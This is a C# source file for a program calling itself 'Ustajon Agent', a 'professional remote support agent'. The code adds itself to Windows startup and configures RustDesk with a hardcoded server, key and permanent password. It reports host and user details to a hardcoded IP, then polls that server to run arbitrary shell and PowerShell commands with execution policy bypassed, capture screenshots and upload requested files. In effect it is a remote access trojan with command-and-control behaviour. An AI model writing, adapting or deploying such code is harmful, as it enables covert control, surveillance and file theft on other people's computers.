/*
╔══════════════════════════════════════════════════════════════════════════════╗
║                     USTAJON AGENT v2.0 - C# Edition                          ║
║                   Professional Remote Support Agent                           ║
║                      © 2025 Ustajon Technologies                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
*/

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace UstajonAgent
{
    class Program
    {
        // ============ CONFIGURATION ============
        private const string SERVER_URL = "http://31.220.75.75";
        private const string RUSTDESK_SERVER = "31.220.75.75";
        private const string RUSTDESK_KEY = "YHo+N4vp+ZWP7wedLh69zCGk3aFf4935hwDKX9OdFXE=";
        private const string RUSTDESK_PASSWORD = "ustajon2025";
        private const int HEARTBEAT_INTERVAL = 5000; // 5 seconds
        private const string VERSION = "2.0.0";

        private static readonly HttpClient httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
        private static string clientId = "";
        private static string rustdeskId = "";
        private static bool isRunning = true;

        // Windows API for screenshot
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);
        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);
        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        static async Task Main(string[] args)
        {
            Console.WriteLine("╔══════════════════════════════════════════════════════════════╗");
            Console.WriteLine("║           USTAJON AGENT v2.0 - Remote Support                ║");
            Console.WriteLine("╚══════════════════════════════════════════════════════════════╝");

            // Initialize
            clientId = GetOrCreateClientId();
            rustdeskId = GetRustDeskId();

            Console.WriteLine($"[*] Agent ID: {clientId}");
            Console.WriteLine($"[*] RustDesk ID: {rustdeskId}");

            // Setup
            SetupRustDesk();
            AddToStartup();

            // Register with server
            await Register();

            // Main loop
            while (isRunning)
            {
                try
                {
                    var commands = await Heartbeat();
                    foreach (var cmd in commands)
                    {
                        await ExecuteCommand(cmd);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error: {ex.Message}");
                }

                await Task.Delay(HEARTBEAT_INTERVAL);
            }
        }

        // ============ CLIENT ID ============
        private static string GetOrCreateClientId()
        {
            string configDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "UstajonAgent");
            string idFile = Path.Combine(configDir, "client_id.txt");

            try
            {
                if (File.Exists(idFile))
                {
                    string id = File.ReadAllText(idFile).Trim();
                    if (!string.IsNullOrEmpty(id)) return id;
                }

                // Generate new ID
                Directory.CreateDirectory(configDir);
                string newId = Guid.NewGuid().ToString().Substring(0, 8);
                File.WriteAllText(idFile, newId);
                return newId;
            }
            catch
            {
                return Guid.NewGuid().ToString().Substring(0, 8);
            }
        }

        // ============ RUSTDESK ============
        private static string GetRustDeskId()
        {
            string[] configPaths = {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RustDesk", "config", "RustDesk.toml"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RustDesk", "config", "RustDesk.toml"),
                @"C:\Users\Public\RustDesk\config\RustDesk.toml"
            };

            foreach (var path in configPaths)
            {
                try
                {
                    if (File.Exists(path))
                    {
                        var content = File.ReadAllText(path);
                        foreach (var line in content.Split('\n'))
                        {
                            if (line.Trim().StartsWith("id"))
                            {
                                var parts = line.Split('=');
                                if (parts.Length > 1)
                                {
                                    return parts[1].Trim().Trim('\'', '"');
                                }
                            }
                        }
                    }
                }
                catch { }
            }

            return "unknown";
        }

        private static void SetupRustDesk()
        {
            Console.WriteLine("[*] Setting up RustDesk...");

            string config = $@"rendezvous_server = '{RUSTDESK_SERVER}'
nat_type = 1
serial = 0

[options]
direct-server = 'Y'
allow-auto-disconnect = 'Y'
enable-keyboard = 'Y'
custom-rendezvous-server = '{RUSTDESK_SERVER}'
relay-server = '{RUSTDESK_SERVER}'
key = '{RUSTDESK_KEY}'
";

            string[] configDirs = {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RustDesk", "config"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RustDesk", "config")
            };

            foreach (var dir in configDirs)
            {
                try
                {
                    Directory.CreateDirectory(dir);
                    File.WriteAllText(Path.Combine(dir, "RustDesk2.toml"), config);
                    Console.WriteLine($"[+] Config written to: {dir}");
                }
                catch { }
            }

            // Set password via registry
            try
            {
                using var key = Registry.CurrentUser.CreateSubKey(@"Software\RustDesk\RustDesk\config");
                key?.SetValue("permanent_password", RUSTDESK_PASSWORD);
                Console.WriteLine("[+] RustDesk password set");
            }
            catch { }
        }

        private static void AddToStartup()
        {
            try
            {
                string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "";
                if (!string.IsNullOrEmpty(exePath))
                {
                    using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    key?.SetValue("UstajonAgent", exePath);
                    Console.WriteLine("[+] Added to startup");
                }
            }
            catch { }
        }

        // ============ SYSTEM INFO ============
        private static (float cpu, float ram, float disk) GetSystemInfo()
        {
            float cpu = 0, ram = 0, disk = 0;

            try
            {
                // CPU
                using var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                cpuCounter.NextValue();
                System.Threading.Thread.Sleep(100);
                cpu = cpuCounter.NextValue();
            }
            catch { }

            try
            {
                // RAM
                var gcMemory = GC.GetTotalMemory(false);
                using var ramCounter = new PerformanceCounter("Memory", "Available MBytes");
                var available = ramCounter.NextValue();
                var total = GetTotalPhysicalMemory();
                if (total > 0)
                {
                    ram = ((total - available * 1024 * 1024) / total) * 100;
                }
            }
            catch { }

            try
            {
                // Disk
                var drive = new DriveInfo("C");
                disk = ((float)(drive.TotalSize - drive.AvailableFreeSpace) / drive.TotalSize) * 100;
            }
            catch { }

            return (cpu, ram, disk);
        }

        private static long GetTotalPhysicalMemory()
        {
            try
            {
                using var mc = new ManagementClass("Win32_ComputerSystem");
                foreach (ManagementObject mo in mc.GetInstances())
                {
                    return Convert.ToInt64(mo["TotalPhysicalMemory"]);
                }
            }
            catch { }
            return 0;
        }

        private static string GetLocalIp()
        {
            try
            {
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                return ip.Address.ToString();
                            }
                        }
                    }
                }
            }
            catch { }
            return "unknown";
        }

        // ============ API CALLS ============
        private static async Task Register()
        {
            Console.WriteLine("[*] Registering with server...");

            var (cpu, ram, disk) = GetSystemInfo();

            var data = new Dictionary<string, object>
            {
                ["client_id"] = clientId,
                ["hostname"] = Environment.MachineName,
                ["username"] = Environment.UserName,
                ["os"] = "Windows",
                ["os_version"] = Environment.OSVersion.VersionString,
                ["local_ip"] = GetLocalIp(),
                ["rustdesk_id"] = rustdeskId,
                ["version"] = VERSION,
                ["cpu_usage"] = cpu,
                ["ram_usage"] = ram,
                ["disk_usage"] = disk
            };

            try
            {
                var json = JsonSerializer.Serialize(data);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var response = await httpClient.PostAsync($"{SERVER_URL}/api/register", content);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("[+] Registered successfully");
                }
                else
                {
                    Console.WriteLine($"[-] Registration failed: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Connection error: {ex.Message}");
            }
        }

        private static async Task<List<AgentCommand>> Heartbeat()
        {
            var (cpu, ram, disk) = GetSystemInfo();

            var data = new Dictionary<string, object>
            {
                ["client_id"] = clientId,
                ["cpu_usage"] = cpu,
                ["ram_usage"] = ram,
                ["disk_usage"] = disk
            };

            try
            {
                var json = JsonSerializer.Serialize(data);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var response = await httpClient.PostAsync($"{SERVER_URL}/api/heartbeat", content);

                if (response.IsSuccessStatusCode)
                {
                    var responseJson = await response.Content.ReadAsStringAsync();
                    var result = JsonSerializer.Deserialize<HeartbeatResponse>(responseJson);
                    return result?.commands ?? new List<AgentCommand>();
                }
            }
            catch { }

            return new List<AgentCommand>();
        }

        private static async Task SendCommandResult(string commandId, bool success, string output)
        {
            var data = new Dictionary<string, object>
            {
                ["command_id"] = commandId,
                ["success"] = success,
                ["output"] = output
            };

            try
            {
                var json = JsonSerializer.Serialize(data);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await httpClient.PostAsync($"{SERVER_URL}/api/agent/command-result", content);
            }
            catch { }
        }

        // ============ COMMAND EXECUTION ============
        private static async Task ExecuteCommand(AgentCommand cmd)
        {
            Console.WriteLine($"[*] Executing: {cmd.type} ({cmd.id})");

            string output = "";
            bool success = true;

            try
            {
                switch (cmd.type)
                {
                    case "cmd":
                    case "shell":
                        output = RunShellCommand(cmd.command ?? "");
                        break;

                    case "powershell":
                        output = RunPowerShell(cmd.command ?? "");
                        break;

                    case "screenshot":
                        await CaptureAndUploadScreenshot(cmd.id);
                        return;

                    case "system_info":
                        output = GetDetailedSystemInfo();
                        break;

                    case "process_list":
                        output = GetProcessList();
                        break;

                    case "kill_process":
                        output = KillProcess(cmd.command ?? "");
                        break;

                    case "list_files":
                        output = ListDirectory(cmd.command ?? "C:\\");
                        break;

                    case "download_file":
                        await UploadFileToServer(cmd.id, cmd.command ?? "");
                        return;

                    case "shutdown":
                        output = ShutdownSystem();
                        break;

                    case "restart":
                        output = RestartSystem();
                        break;

                    default:
                        output = $"Unknown command: {cmd.type}";
                        success = false;
                        break;
                }
            }
            catch (Exception ex)
            {
                output = $"Error: {ex.Message}";
                success = false;
            }

            await SendCommandResult(cmd.id, success, output);
        }

        private static string RunShellCommand(string command)
        {
            Console.WriteLine($"[*] Running: {command}");

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(psi);
                if (process == null) return "Failed to start process";

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit(30000);

                return string.IsNullOrEmpty(error) ? output : $"{output}\n{error}";
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }

        private static string RunPowerShell(string command)
        {
            Console.WriteLine($"[*] Running PowerShell: {command}");

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-ExecutionPolicy Bypass -Command \"{command}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(psi);
                if (process == null) return "Failed to start process";

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit(30000);

                return $"{output}{error}";
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }

        private static string GetDetailedSystemInfo()
        {
            var sb = new StringBuilder();

            sb.AppendLine("=== System Info ===");
            sb.AppendLine($"Hostname: {Environment.MachineName}");
            sb.AppendLine($"Username: {Environment.UserName}");
            sb.AppendLine($"OS: {Environment.OSVersion}");
            sb.AppendLine($".NET: {Environment.Version}");
            sb.AppendLine($"Processors: {Environment.ProcessorCount}");

            sb.AppendLine("\n=== Drives ===");
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady)
                {
                    var totalGB = drive.TotalSize / 1024 / 1024 / 1024;
                    var freeGB = drive.AvailableFreeSpace / 1024 / 1024 / 1024;
                    sb.AppendLine($"{drive.Name}: {totalGB}GB total, {freeGB}GB free");
                }
            }

            sb.AppendLine("\n=== Network ===");
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up)
                {
                    sb.AppendLine($"{ni.Name}: {ni.NetworkInterfaceType}");
                }
            }

            return sb.ToString();
        }

        private static string GetProcessList()
        {
            var sb = new StringBuilder();
            sb.AppendLine("PID\tMemory MB\tName");
            sb.AppendLine(new string('-', 50));

            var processes = Process.GetProcesses()
                .OrderByDescending(p => p.WorkingSet64)
                .Take(50);

            foreach (var p in processes)
            {
                try
                {
                    var memMB = p.WorkingSet64 / 1024 / 1024;
                    sb.AppendLine($"{p.Id}\t{memMB}\t\t{p.ProcessName}");
                }
                catch { }
            }

            return sb.ToString();
        }

        private static string KillProcess(string pidStr)
        {
            if (int.TryParse(pidStr.Trim(), out int pid))
            {
                try
                {
                    var process = Process.GetProcessById(pid);
                    process.Kill();
                    return $"Process {pid} killed";
                }
                catch (Exception ex)
                {
                    return $"Error: {ex.Message}";
                }
            }
            return $"Invalid PID: {pidStr}";
        }

        private static string ListDirectory(string path)
        {
            var sb = new StringBuilder();
            sb.AppendLine($"Directory: {path}\n");
            sb.AppendLine("Type\tSize\t\tName");
            sb.AppendLine(new string('-', 50));

            try
            {
                var dir = new DirectoryInfo(path);

                foreach (var d in dir.GetDirectories())
                {
                    sb.AppendLine($"DIR\t\t\t{d.Name}");
                }

                foreach (var f in dir.GetFiles())
                {
                    sb.AppendLine($"FILE\t{f.Length}\t\t{f.Name}");
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Error: {ex.Message}");
            }

            return sb.ToString();
        }

        private static async Task CaptureAndUploadScreenshot(string commandId)
        {
            Console.WriteLine("[*] Capturing screenshot...");

            try
            {
                int width = GetSystemMetrics(0); // SM_CXSCREEN
                int height = GetSystemMetrics(1); // SM_CYSCREEN

                using var bitmap = new Bitmap(width, height);
                using var g = Graphics.FromImage(bitmap);

                g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));

                using var ms = new MemoryStream();
                bitmap.Save(ms, ImageFormat.Jpeg);
                var base64 = Convert.ToBase64String(ms.ToArray());

                var data = new Dictionary<string, object>
                {
                    ["client_id"] = clientId,
                    ["command_id"] = commandId,
                    ["image"] = base64
                };

                var json = JsonSerializer.Serialize(data);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await httpClient.PostAsync($"{SERVER_URL}/api/agent/screenshot", content);

                Console.WriteLine("[+] Screenshot uploaded");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Screenshot error: {ex.Message}");
                await SendCommandResult(commandId, false, $"Screenshot error: {ex.Message}");
            }
        }

        private static async Task UploadFileToServer(string commandId, string filePath)
        {
            Console.WriteLine($"[*] Uploading file: {filePath}");

            try
            {
                if (!File.Exists(filePath))
                {
                    await SendCommandResult(commandId, false, $"File not found: {filePath}");
                    return;
                }

                var fileData = await File.ReadAllBytesAsync(filePath);
                var base64 = Convert.ToBase64String(fileData);
                var fileName = Path.GetFileName(filePath);

                var data = new Dictionary<string, object>
                {
                    ["client_id"] = clientId,
                    ["command_id"] = commandId,
                    ["filename"] = fileName,
                    ["data"] = base64
                };

                var json = JsonSerializer.Serialize(data);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await httpClient.PostAsync($"{SERVER_URL}/api/agent/file-upload", content);

                Console.WriteLine("[+] File uploaded");
            }
            catch (Exception ex)
            {
                await SendCommandResult(commandId, false, $"Upload error: {ex.Message}");
            }
        }

        private static string ShutdownSystem()
        {
            Process.Start("shutdown", "/s /t 5");
            return "System shutting down in 5 seconds...";
        }

        private static string RestartSystem()
        {
            Process.Start("shutdown", "/r /t 5");
            return "System restarting in 5 seconds...";
        }
    }

    // ============ DATA CLASSES ============
    public class AgentCommand
    {
        public string id { get; set; } = "";
        public string type { get; set; } = "";
        public string? command { get; set; }
    }

    public class HeartbeatResponse
    {
        public bool success { get; set; }
        public List<AgentCommand> commands { get; set; } = new();
    }
}
